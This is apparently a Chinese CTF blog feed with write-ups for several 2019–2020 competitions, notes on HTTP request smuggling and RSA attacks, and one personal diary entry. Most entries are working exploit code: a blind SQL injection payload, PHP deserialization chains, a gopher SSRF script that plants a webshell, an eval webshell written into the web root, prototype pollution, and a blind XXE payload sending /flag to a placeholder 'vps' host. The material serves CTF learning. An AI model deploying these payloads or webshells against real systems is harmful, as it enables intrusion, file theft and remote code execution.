use strict; use IPC::Open3; my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, &#39;/readflag&#39; ) or die &#34;open3() failed $!&#34;; my $r; $r = &lt;CHLD_OUT&gt;; print &#34;$r&#34;; $r = &lt;CHLD_OUT&gt;; print &#34;$r&#34;; $r = eval &#34;$r&#34;; print &#34;$r\n&#34;; print CHLD_IN &#34;$r\n&#34;; $r = &lt;CHLD_OUT&gt;; print &#34;$r&#34;; $r = &lt;CHLD_OUT&gt;; print &#34;$r&#34;; carefuleyes 在改名的地方进行二次注入
sd&#39; or if(substr((select group_concat(username) from user where privilege=&#39;admin&#39;),1,1)=&#39;X&#39;,exp(5000),1)# 得到用户名和密码之后进行序列化登陆就可以了
  ]]></content></entry><entry><title>qwb2020web复现</title><url>/posts/ctf-qwb2020-web-1/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  half_infiltration 开局的页面如下
&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?&gt; 然后我们可以看到ssrf.php的内容
&lt;?php //经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网 $url = $_GET[&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;] ?? false; if(preg_match(&#34;/flag|var|apache|conf|proc|log/i&#34; ,$url)){ die(&#34;&#34;); } if($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 1); curl_exec($ch); curl_close($ch); } ?&gt; 扫描发现
http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/
有东西
HTTP/1.1 200 OK Date: Thu, 27 Aug 2020 13:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Length: 1121 Content-Type: text/html; charset=UTF-8 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Message Board&lt;/title&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;css/bootstrap.min.css&#34; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;container&#34; style=&#34;text-align:center;vertical-align:middle;&#34;&gt; &lt;div class=&#34;row&#34; style=&#34;text-align:center;vertical-align:middle;&#34;&gt; &lt;h1&gt;Message Board &lt;/h1&gt; &lt;/div&gt; &lt;div class=&#34;row&#34;&gt; &lt;br&gt;&lt;br&gt; &lt;p class=&#34;lead&#34;&gt; Since there is only one administrator, a person can only submit one opinion at a time. Each time a new opinion is submitted, all old comments will be deleted &lt;br&gt;&lt;br&gt; &lt;/p&gt; &lt;/div&gt; &lt;br&gt; &lt;div class=&#34;row&#34; style=&#34;text-align:center;vertical-align:middle;&#34;&gt; &lt;form method=&#34;POST&#34; class=&#34;form-inline&#34;&gt; &lt;div class=&#34;form-group&#34;&gt; &lt;input class=&#39;form-control&#39; type=&#34;text&#34; name=&#34;file&#34;&gt; &lt;/div&gt; &lt;div class=&#39;panel-body&#39;&gt; &lt;textarea class=&#39;form-control&#39; name=&#39;content&#39; rows=&#39;6&#39;&gt;&lt;/textarea&gt; &lt;br&gt; &lt;br&gt; &lt;div class=&#34;form-group&#34;&gt; &lt;button type=&#34;submit&#34; class=&#39;btn btn-default col-md-2 form-control&#39; value=&#34;Submit&#34;&gt;Submit&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; 同时
http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/
可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过.
import requests from urllib.parse import urlencode, quote_plus, quote url0 = &#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_&#34; upload_data = { &#39;file&#39;:&#39;php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php&#39;, &#39;content&#39;:&#39;UEQ4OVlHTmhkQ0F2Wm14aFoyQTc&#39; # 似乎可以正常解密的base64都无法写入文件中 } upload_data = urlencode(upload_data, quote_via=quote_plus) print(upload_data) gopher_content = &#39;&#39;&#39;POST / HTTP/1.1 Host: 127.0.0.1:40000 Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: {length} {data}&#39;&#39;&#39;.format(length = len(upload_data), data=upload_data).replace(&#39;\n&#39;, &#39;\r\n&#39;) # ssrf need double url encode url = url0 + quote(quote(gopher_content)) header = {&#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;, &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#34;, &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;, &#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;, &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#34;, &#34;Connection&#34;: &#34;close&#34;} while True: requests.get(url, headers=header) validate = &#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php res = requests.get(validate) print(res.content)   ]]></content></entry><entry><title>http请求走私笔记</title><url>/posts/sec-http-smuggling/</url><categories><category>安全研究</category></categories><tags/><content type="html">  正常的请求
请求走私, 攻击者通过在自己的请求中夹带一个请求, 来影响到下一个请求中, 一个典型的例子是反射型xss, 通过在上一次请求中走私一个请求头, 就可以在正常用户接下来进行的一次正常请求的过程中纂改其请求内容, 比如修改他的请求路径为一个反射性xss链接, 这样就可以达到让用户点击正常链接但是却触发xss链接的目的.
其他的利用
捕获用户请求 缓存投毒 绕过waf(夹带危险请求url, 并在下一次正常请求的时候触发) 绕过前端安全控制 首先要知道http发包过程中两个标头的意思
Content-Length
表示请求体的长度, 简称CL Content-Length: 10 8 HELLO 10个长度指的是以下内容的长度
8\r\n HELLO\r\n Transfer-Encoding, 简称TE
表示编码时使用的安全传输的形式有效载荷体 # 常见的几种 Transfer-Encoding: chunked Transfer-Encoding: compress Transfer-Encoding: deflate Transfer-Encoding: gzip Transfer-Encoding: identity 请求走私中一般用的都是chunked, 将消息正文视为使用分块编码.这里声明8字节长度, 经过一个换行后开始统计, 统计完8字节后经过一个换行表示下一个数据块开始, 长度为0, 被视为请求终止
Transfer-Encoding: chunked 8 SMUGGLED 0 一个典型的请求如下
HTTP/1.1 200 OK Content-Type: text/plain Transfer-Encoding: chunked 7\r\n Mozilla\r\n 9\r\n Developer\r\n 7\r\n Network\r\n 0\r\n \r\n 请求走私发生在存在前端服务器和后端服务器的情况下, 一般有这么几种
CL-TE: 前端服务器识别的是Content_-Length, 后端服务器识别的是Transfer-Encoding TE-CL: 前端服务器识别的是Transfer-Encoding, 后端服务器识别的是Content-Length TE-TE: 前端服务器和后端服务器都是识别Transfer-Encoding的,  …  </content></entry><entry><title>ciscn2020_online</title><url>/posts/ctf-ciscn2020-online/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[   web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下
easyphp 要让子进程异常退出, 先打印出php的所有内置函数然后爆破发包发现这个函数可以让他异常退出
a=stream_socket_server babyunserialize 传入flag并对flag进行反序列化, 搜索__destruct函数后决定用jip.php
function __destruct() { if ($this-&gt;lazy) { $this-&gt;lazy = FALSE; foreach ($this-&gt;data?:[] as $file =&gt; $data) $this-&gt;write($file,$data); } } function write($file,array $data=NULL) { if (!$this-&gt;dir || $this-&gt;lazy) return count($this-&gt;data[$file]=$data); $fw=\Base::instance(); switch ($this-&gt;format) { case self::FORMAT_JSON: $out=json_encode($data,JSON_PRETTY_PRINT); break; case self::FORMAT_Serialized: $out=$fw-&gt;serialize($data); break; } return $fw-&gt;write($this-&gt;dir.$file,$out); } exp如下
&lt;?php namespace DB{ class jig{ const FORMAT_JSON=1, FORMAT_Serialized=0; protected $dir; protected $data; protected $lazy; protected $format; public function __construct($dir,$data,$lazy) { $this-&gt;data = $data; $this-&gt;dir = $dir; $this-&gt;lazy = $lazy; $this-&gt;format = 0; } } } namespace ddd{ $a = new \DB\jig(&#34;/var/www/html/&#34;, [&#34;kkk.php&#34;=&gt; [&#39;&lt;?php eval($_POST[1]);?&gt;&#39;]], True); echo urlencode(serialize($a)); } ?&gt; littlegame javascript原型链污染
关键代码
router.post(&#34;/DeveloperControlPanel&#34;, function (req, res, next) { // not implement if (req.body.key === undefined || req.body.password === undefined){ res.send(&#34;What&#39;s your problem?&#34;); }else { let key = req.body.key.toString(); let password = req.body.password.toString(); if(Admin[key] === password){ res.send(process.env.flag); }else { res.send(&#34;Wrong password!Are you Admin?&#34;); } } }); router.get(&#39;/SpawnPoint&#39;, function (req, res, next) { req.session.knight = { &#34;HP&#34;: 1000, &#34;Gold&#34;: 10, &#34;Firepower&#34;: 10 } res.send(&#34;Let&#39;s begin!&#34;); }); router.post(&#34;/Privilege&#34;, function (req, res, next) { // Why not ask witch for help? if(req.session.knight === undefined){ res.redirect(&#39;/SpawnPoint&#39;); }else{ if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) { res.send(&#34;What&#39;s your problem?&#34;); }else { let key = req.body.NewAttributeKey.toString(); let value = req.body.NewAttributeValue.toString(); setFn(req.session.knight, key, value); res.send(&#34;Let&#39;s have a check!&#34;); } } }); 污染req.session.knight
exp如下
import requests url = &#34;http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/&#34; data1 = { &#34;NewAttributeKey&#34;:&#34;constructor.prototype.ch3n9w&#34;, &#34;NewAttributeValue&#34;:&#34;1234&#34; } data2 = { &#34;key&#34;:&#39;ch3n9w&#39;, &#39;password&#39;:&#39;1234&#39; } sess = requests.Session() sess.get(url+&#34;SpawnPoint&#34;) sess.post(url+&#34;Privilege&#34;,data=data1) r = sess.post(url+&#34;DeveloperControlPanel&#34;,data=data2) print(r.text) rceme 搜索发现https://www.anquanke.com/post/id/212603#h2-0, 拿着payload直接打就可以了
easytrick &lt;?php class trick{ public $trick1; public $trick2; public function __construct($a, $b) { $this-&gt;trick1 = $a; $this-&gt;trick2 = $b; } public function __destruct(){ $this-&gt;trick1 = (string)$this-&gt;trick1; if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5){ die(&#34;你太长了&#34;); } if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2){ echo file_get_contents(&#34;/flag&#34;); } } } $a = new trick(INF, INF); echo urlencode(serialize($a));   ]]></content></entry><entry><title>网鼎杯2020 web</title><url>/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
绝对路径
/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
读日志文件 logs/catalina.out
​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xlsx&amp;#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&amp;#34;poi-ooxml-3.10 has something wrong&amp;#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk 新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ENTITY % data3 SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt; &amp;lt;!ENTITY % sp SYSTEM &amp;#34;http://vps/ext.dtd&amp;#34;&amp;gt; %sp; %param3; %exfil; ]&amp;gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
&amp;lt;!ENTITY % param3 &amp;#34;&amp;lt;!ENTITY &amp;amp;#37; exfil SYSTEM …  ]]></content></entry><entry><title>padding_oracle 和 cbc字节反转</title><url>/posts/sec-padding-oracle-and-cbc-attack/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  padding oracle 原理: https://www.freebuf.com/articles/database/150606.html [NPUCTF2020]web狗 打开来看到了源代码
&amp;lt;?php error_reporting(0); include(&amp;#39;config.php&amp;#39;); # $key,$flag define(&amp;#34;METHOD&amp;#34;, &amp;#34;aes-128-cbc&amp;#34;); //定义加密方式 define(&amp;#34;SECRET_KEY&amp;#34;, $key); //定义密钥 define(&amp;#34;IV&amp;#34;,&amp;#34;6666666666666666&amp;#34;); //定义初始向量 16个6 define(&amp;#34;BR&amp;#34;,&amp;#39;&amp;lt;br&amp;gt;&amp;#39;); if(!isset($_GET[&amp;#39;source&amp;#39;]))header(&amp;#39;location:./index.php?source=1&amp;#39;); #var_dump($GLOBALS); //听说你想看这个？ function aes_encrypt($iv,$data) { echo &amp;#34;--------encrypt---------&amp;#34;.BR; echo &amp;#39;IV:&amp;#39;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR; } function aes_decrypt($iv,$data) { return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&amp;#39;False&amp;#39;); } if($_GET[&amp;#39;method&amp;#39;]==&amp;#39;encrypt&amp;#39;) { $iv = IV; $data = $flag; echo aes_encrypt($iv,$data); } else if($_GET[&amp;#39;method&amp;#39;]==&amp;#34;decrypt&amp;#34;) { …  ]]></content></entry><entry><title>临行前夜--2019</title><url>/posts/gossip-note-before-back/</url><categories><category>碎碎念</category></categories><tags/><content type="html"><![CDATA[  昨晚约好的车今天早上竟然被司机一声不吭取消了, 真的无语&hellip;&hellip;得亏睡得浅起床看了一眼.新约的车又要早早开往机场, 于是无奈起了个大早. 到达后又被通知延误, 也不知和离开时候的飞雪有无关系, 但不管怎样, 孤身顶着鹅毛行走路上, 这样离开倒还是别有风味, 于是也有了碎碎念的兴致.
今年的事情较去年简单了很多, 也没那么多想法, 总结起来无非就是把系统换成了ubuntu又换回了windows, 在环境上下了很多功夫, 浪费了很多时间, 打了几次被带飞的比赛, 去了趟xman, 认识了一些很有趣的朋友和网友, 然后觉得自己更加的菜要努力了, 其他没了.
没了?
看起来的确是这样平淡的一年, 也没有什么特别值得纪念的事情, 就在自己怀着&quot;啊又是平淡的一年啊&quot;的心态准备开始2020的时候, 由于一些意外, 我开始追求自己喜欢的姑娘了. 虽然不知道结果如何, 反正不后悔就是了, 临阵脱逃这种事情要是做了会被自己看不起的.
另外, 也得列个新年计划吧, 不然可太水了:
学会java web django搭博客 flask 搭博客 每天至少刷题一道web一道密码 每天回忆复习, 每周回忆和复习 每天吃水果 看完书 web前端黑客技术解密 白帽子讲web安全 10点之后不看b站, 早睡早起   ]]></content></entry><entry><title>java_web题目复现记录</title><url>/posts/sec-java-web/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  开一个新坑~~
2020 网鼎杯 filejava 读目录可以爆出绝对路径
读下tomcat的日志(logs/catalina.out), 看到一个war包, 下载, 看到upload的时候会解析
if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xlsx&amp;#34;.equals(fileExtName)) { try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException var20) { System.err.println(&amp;#34;poi-ooxml-3.10 has something wrong&amp;#34;); var20.printStackTrace(); } } 然后参考https://www.jishuwen.com/d/2inW/zh-hk 把workbook.xml和content-type.xml都改了
2020 VNCTF easyspringmvc 考察java反序列化
下载war包后用jd-gui打开看源代码, 目录结构
主要看classes.com下面的
PictureController.class
package WEB-INF.classes.com.controller; import com.controller.PictureController; import com.tools.ClientInfo; import java.io.File; import java.io.FileInputStream; import java.io.InputStream; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import …  ]]></content></entry><entry><title>LD_PRELOAD劫持类型题目</title><url>/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  贴几个参考链接
https://www.cnblogs.com/wfzWebSecuity/p/11213732.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD byteCTF babyblog 看首页
功能点
写博客 编辑博客 删除博客 查找字符串并替换 这个replace有点诡异, 需要vip身份, 看源代码关键的一步在edit.php中
if(isset($_POST[&amp;#39;title&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;content&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;id&amp;#39;])){ foreach($sql-&amp;gt;query(&amp;#34;select * from article where id=&amp;#34; . intval($_POST[&amp;#39;id&amp;#39;]) . &amp;#34;;&amp;#34;) as $v){ $row = $v; } if($_SESSION[&amp;#39;id&amp;#39;] == $row[&amp;#39;userid&amp;#39;]){ $title = addslashes($_POST[&amp;#39;title&amp;#39;]); $content = addslashes($_POST[&amp;#39;content&amp;#39;]); $sql-&amp;gt;query(&amp;#34;update article set title=&amp;#39;$title&amp;#39;,content=&amp;#39;$content&amp;#39; where title=&amp;#39;&amp;#34; . $row[&amp;#39;title&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;); exit(&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;Edited successfully.&amp;#39;);location.href=&amp;#39;index.php&amp;#39;;&amp;lt;/script&amp;gt;&amp;#34;); }else{ exit(&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;You do not have …  ]]></content></entry><entry><title>copperstudy-record</title><url>/posts/ctf-qwb-copperstudy-record/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  强网杯 2019 copperstudy 拖拖拉拉终于把这题复现了&hellip;
开局计算哈希, 爆破爆破
from Crypto.Util.number import * import hashlib from pwn import * import gmpy2 r = remote(&#39;node3.buuoj.cn&#39;, 26182) r.recvuntil(&#34;hexdigest()=&#34;) digest = r.recvline() r.recvuntil(&#34;&#39;hex&#39;)=&#34;) skr5 = r.recvline()[:-1] def proof(skr5, digest): for i in range(64*256*256, 256*256*256): result = hashlib.sha256(skr5.decode(&#39;hex&#39;) + long_to_bytes(i)).hexdigest() if result == digest: print(&#34;found it!&#34;) return ((skr5.decode(&#39;hex&#39;)+long_to_bytes(i)).encode(&#39;hex&#39;)) skr = proof(skr5, digest) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(skr) r.interactive() challenge1 n e c m的高位 解
n = 13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 e = 3 c = 15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517 m_high = 2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736 kbits = 72 PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = (m_high + x)^e - c solv = f.small_roots(X=2^kbits, beta=1)[0] print(&#34;x: %s&#34; % hex(int(solv))) challenge2 n e c p的高位 能在n的因子的整数域中等于0也可以构造方程
n=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219 e=65537 c=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778 p_high128 = 97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672 pbits = 128 PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = p_high128 + x x0 = f.small_roots(X=2^pbits, beta=0.3)[0] p = p_high128 + int(x0) q = n // p print(&#34;p: %s&#34; % p) print(&#34;q: %s&#34; % q) 然后解出明文即可
challenge3 n e c d的低512位 就硬套
def partial_p(p0, kbits, n): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) nbits = 1024 f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.2) if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p) def find_p(d0, kbits, e, n): X = var(&#39;X&#39;) for k in xrange(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p: return p if __name__ == &#34;__main__&#34;: n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 e=3 c=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955 nbits = n.nbits() kbits = 512 d0 = d &amp; (2^kbits-1) p = find_p(d0, kbits, e, n) print &#34;found p: %d&#34; %p q = n // p print &#34;d: %d&#34; % inverse_mod(e, (p-1)*(q-1)) 解出明文发送
challenge4 n1 c1 n2 c2 n3 c3 e=3 常规的广播攻击, 使用中国剩余定理
import gmpy2 from Crypto.Util.number import * e=3 n1=78642188663937191491235684351005990853149481644703243255021321296087539054265733392095095639539412823093600710316645130404423641473150336492175402885270861906530337207734106926328737198871118125840680572148601743121884788919989184318198417654263598170932154428514561079675550090698019678767738203477097731989 c1=23419685303892339080979695469481275906709035609088426118328601771163101123641599051556995351678670765521269546319724616458499631461037359417701720430452076029312714313804716888119910334476982840024696320503747736428099717113471541651211596481005191146454458591558743268791485623924245960696651150688621664860 n2=98174485544103863705821086588292917749386955237408645745685476234349659452606822650329076955303471252833860010724515777826660887118742978051231030080666542833950748806944312437614585352818344599399156268450521239843157288915059003487783576003027303399985723834248634230998110618288843582573006048070816520647 c2=72080679612442543693944655041130370753964497034378634203383617624269927191363529233872659451561571441107920350406295389613006330637565645758727103723546610079332161151567096389071050158035757745766399510575237344950873632114050632573903701015749830874081198250578516967517980592506626547273178363503100507676 n3=91638855323231795590642755267985988356764327384001022396221901964430032527111968159623063760057482761918901490239790230176524505469897183382928646349163030620342744192731246392941227433195249399795012672172947919435254998997253131826888070173526892674308708289629739522194864912899817994807268945141349669311 c3=22149989692509889061584875630258740744292355239822482581889060656197919681655781672277545701325284646570773490123892626601106871432216449814891757715588851851459306683123591338089745675044763551335899599807235257516935037356212345033087798267959242561085752109746935300735969972249665700075907145744305255616 assert(gmpy2.gcd(n1, n2)==1) assert(gmpy2.gcd(n1, n3)==1) def chinese_remainder(N, C): all_n = reduce(lambda a,b: a*b, N) result = 0 for i in range(len(C)): ni = all_n // N[i] ni_inv = gmpy2.invert(ni, N[i]) result += ni_inv * C[i] * ni return result % all_n N = [n1, n2, n3] C = [c1, c2, c3] result = chinese_remainder(N, C) all_n = reduce(lambda a,b: a*b, N) # print all_n i = 0 while True: root, exact = gmpy2.iroot(result+i*all_n, 3) if exact: print root exit(0) i+=1 challenge5 c = encrypt(m) x = encrypt(m+1) n e=3 相关消息攻击, 套ctfwiki的公式
import gmpy2 p1=1 p2=0 c2 =112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021533447981943498594790549326550460216939216988828130624120379925895123186121819609415184887470233938291227816332249857236198616538782622327476603338806349004620909717360739157545735826670038169284252348037995399308 c1 =112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021552486915464025361447529153776277710423467951041523831865232164370127602772602643378592695459331174613894578701940837730590029577336924367384969935652616989527416027725713616493815764725131271563545176286794438175 n =113604829563460357756722229849309932731534576966155520277171862442445354404910882358287832757024693652075211204635679309777620586814014894544893424988818766425089667672311645586528776360047956843961901352792631908859388801090108188344342619580661377758180391734771694803991493164412644148805229529911069578061 a = 1 b = p1-p2 def getmessage(a, b, c1, c2, n): b3 = gmpy2.powmod(b, 3, n) part1 = b * (c1 + 2 * c2 - b3) % n part2 = a * (c1 - c2 + 2 * b3) % n part2 = gmpy2.invert(part2, n) return part1 * part2 % n message = getmessage(a, b, c1, c2, n) -p2 print message message = hex(message)[2:] print message challenge6 e c n assert(d&lt;n的0.27次方) 只要d小于n的0.292次方就有Boneh and Durfee attack
https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage 改改数据, 跑一下就有了
整合 from Crypto.Util.number import * import os import hashlib from pwn import * import gmpy2 r = remote(&#39;node3.buuoj.cn&#39;, 26182) r.recvuntil(&#34;hexdigest()=&#34;) digest = r.recvline() r.recvuntil(&#34;&#39;hex&#39;)=&#34;) skr5 = r.recvline()[:-1] def proof(skr5, digest): for i in range(64*256*256, 256*256*256): result = hashlib.sha256(skr5.decode(&#39;hex&#39;) + long_to_bytes(i)).hexdigest() if result == digest: print(&#34;found it!&#34;) return ((skr5.decode(&#39;hex&#39;)+long_to_bytes(i)).encode(&#39;hex&#39;)) skr = proof(skr5, digest) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(skr) # r.interactive() x0 = 0x35343237323432377dL m_high = 2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736 ans1 = long_to_bytes(x0 + m_high).encode(&#39;hex&#39;) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(ans1) p = 97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560661715295741651653499691458486798196487 q = 131093675711613661161476275473445206682597559447006571385482255727609238786596952165801814021602699749876712682307789568113374768689632642728986573211776526473651771104432443501294668372441525987174391472994271054873305324343666279426741897612827889525440428582592216151586138881806196331920758968403508531637 e=65537 c = 627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778 d = gmpy2.invert(e, (q-1)*(p-1)) m = long_to_bytes(pow(c, 